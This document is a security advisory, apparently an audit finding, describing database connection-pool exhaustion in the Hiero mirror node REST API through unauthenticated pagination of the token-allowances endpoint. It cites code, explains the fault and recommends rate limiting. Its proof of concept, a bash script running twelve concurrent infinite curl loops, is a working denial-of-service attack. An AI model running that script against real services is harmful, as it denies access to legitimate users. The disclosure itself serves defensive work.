### Title
Unauthenticated Pagination-Driven DB Connection Pool Exhaustion via `getAccountTokenAllowances()`

### Summary
The `getAccountTokenAllowances()` handler in `rest/controllers/tokenAllowanceController.js` requires no authentication and returns a `links.next` cursor that an attacker can follow indefinitely with `limit=1`. The REST API's Node.js database pool defaults to only 10 connections. An attacker issuing many concurrent paginated requests can exhaust this pool, causing all subsequent DB queries — including those serving gossip transaction data — to queue or timeout.

### Finding Description

**Code path:**

`rest/routes/accountRoute.js:18` registers the route with no authentication middleware:
```js
router.getExt(getPath('allowances/tokens'), TokenAllowanceController.getAccountTokenAllowances);
```

`rest/controllers/tokenAllowanceController.js:68-81` — every request unconditionally issues a DB query:
```js
getAccountTokenAllowances = async (req, res) => {
  const accountId = await EntityService.getEncodedId(...);
  const filters = utils.buildAndValidateFilters(req.query, acceptedTokenAllowanceParameters);
  const query = this.extractTokenMultiUnionQuery(filters, accountId);
  const tokenAllowances = await TokenAllowanceService.getAccountTokenAllowances(query); // DB hit
  ...
  links: { next: this.getPaginationLink(...) }  // cursor returned to caller
};
```

`rest/dbpool.js:14` — the pool is initialized with `maxConnections` from config:
```js
max: config.db.pool.maxConnections,
```

`docs/configuration.md:556` — the default is **10**:
```
hiero.mirror.rest.db.pool.maxConnections | 10
```

`docs/configuration.md:555,557` — connection timeout is 20 s, statement timeout is 20 s, meaning each held connection blocks the pool slot for up to 20 seconds.

**Root cause:** No application-level rate limiting exists in the REST Node.js API. The throttle infrastructure (`ThrottleManagerImpl`, `ThrottleConfiguration`) lives exclusively in the `web3` Java module and does not apply to the Node.js REST service. The REST middleware stack (`rest/middleware/index.js`) exports only `authHandler`, `httpErrorHandler`, `openapiHandler`, `requestHandler`, `requestNormalizer`, `responseCacheHandler`, and `responseHandler` — no rate limiter. The Traefik `rateLimit` middleware is configured only for the Rosetta chart (`charts/hedera-mirror-rosetta/values.yaml:157-160`), not guaranteed for the REST API in default deployments.

**Exploit flow:**
1. Attacker calls `GET /api/v1/accounts/0.0.1/allowances/tokens?limit=1` — receives one record and a `links.next` cursor.
2. Attacker follows `links.next` in a tight loop from N concurrent clients (N ≥ 10).
3. Each concurrent request acquires one DB connection from the 10-connection pool.
4. Pool is fully saturated; all new DB requests (including `/api/v1/transactions`, `/api/v1/blocks`, etc.) queue waiting up to `connectionTimeout` (20 s) before failing.
5. Gossip transaction data served via those endpoints becomes unavailable.

### Impact Explanation
With a default pool of 10 connections and no rate limiting, 10 concurrent unauthenticated HTTP requests are sufficient to fully exhaust the REST API's database pool. All other REST endpoints that serve gossip/transaction data share this same pool (`global.pool` in `rest/dbpool.js`). During exhaustion, legitimate clients receive connection-timeout errors (after 20 s) or queued delays, effectively denying access to transaction data. Severity: **High** — complete availability loss for the REST API with minimal attacker resources.

### Likelihood Explanation
The attack requires zero privileges, zero tokens, and no special knowledge beyond the public API documentation. A single attacker with a modest number of concurrent HTTP connections (10+) can trigger it. The `links.next` cursor is explicitly designed to be followed, making the attack pattern indistinguishable from legitimate bulk enumeration. It is trivially repeatable and scriptable.

### Recommendation
1. **Add per-IP rate limiting** to the REST Node.js application (e.g., `express-rate-limit`) applied globally before route handlers.
2. **Increase the default pool size** or use a connection queue with a short wait timeout to fail fast rather than holding connections.
3. **Enforce a minimum `limit` floor** or add a per-account pagination cap to bound the number of DB round-trips a single session can trigger.
4. **Apply Traefik `inFlightReq` and `rateLimit` middleware** to the REST API Helm chart (mirroring the Rosetta chart configuration).

### Proof of Concept
```bash
# Step 1: Get first page and extract next link
NEXT="/api/v1/accounts/0.0.1/allowances/tokens?limit=1"
BASE="https://<mirror-node-host>"

# Step 2: Launch 10+ concurrent infinite pagination loops
for i in $(seq 1 12); do
  (while true; do
    RESP=$(curl -s "${BASE}${NEXT}")
    NEXT=$(echo "$RESP" | jq -r '.links.next // empty')
    [ -z "$NEXT" ] && NEXT="/api/v1/accounts/0.0.1/allowances/tokens?limit=1"
  done) &
done

# Step 3: Observe that transaction queries now timeout
curl -v "${BASE}/api/v1/transactions?limit=1"
# Expected: connection timeout or 503 after ~20s
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rest/controllers/tokenAllowanceController.js (L68-81)
```javascript
  getAccountTokenAllowances = async (req, res) => {
    const accountId = await EntityService.getEncodedId(req.params[filterKeys.ID_OR_ALIAS_OR_EVM_ADDRESS]);
    const filters = utils.buildAndValidateFilters(req.query, acceptedTokenAllowanceParameters);
    const query = this.extractTokenMultiUnionQuery(filters, accountId);
    const tokenAllowances = await TokenAllowanceService.getAccountTokenAllowances(query);
    const allowances = tokenAllowances.map((model) => new TokenAllowanceViewModel(model));

    res.locals[responseDataLabel] = {
      allowances,
      links: {
        next: this.getPaginationLink(req, allowances, query.bounds, query.limit, query.order),
      },
    };
  };
```

**File:** rest/routes/accountRoute.js (L18-18)
```javascript
router.getExt(getPath('allowances/tokens'), TokenAllowanceController.getAccountTokenAllowances);
```

**File:** rest/dbpool.js (L7-16)
```javascript
const poolConfig = {
  user: config.db.username,
  host: config.db.host,
  database: config.db.name,
  password: config.db.password,
  port: config.db.port,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  max: config.db.pool.maxConnections,
  statement_timeout: config.db.pool.statementTimeout,
};
```

**File:** docs/configuration.md (L555-557)
```markdown
| `hiero.mirror.rest.db.pool.connectionTimeout`                            | 20000                   | The number of milliseconds to wait before timing out when connecting a new database client                                                                                                    |
| `hiero.mirror.rest.db.pool.maxConnections`                               | 10                      | The maximum number of clients the database pool can contain                                                                                                                                   |
| `hiero.mirror.rest.db.pool.statementTimeout`                             | 20000                   | The number of milliseconds to wait before timing out a query statement                                                                                                                        |
```

**File:** rest/middleware/index.js (L1-13)
```javascript
// SPDX-License-Identifier: Apache-2.0

export {authHandler} from './authHandler.js';
export {handleError} from './httpErrorHandler';
export {openApiValidator, serveSwaggerDocs} from './openapiHandler';
export * from './requestHandler';
export {
  cacheKeyGenerator,
  getCache,
  responseCacheCheckHandler,
  responseCacheUpdateHandler,
} from './responseCacheHandler.js';
export {default as responseHandler} from './responseHandler';
```
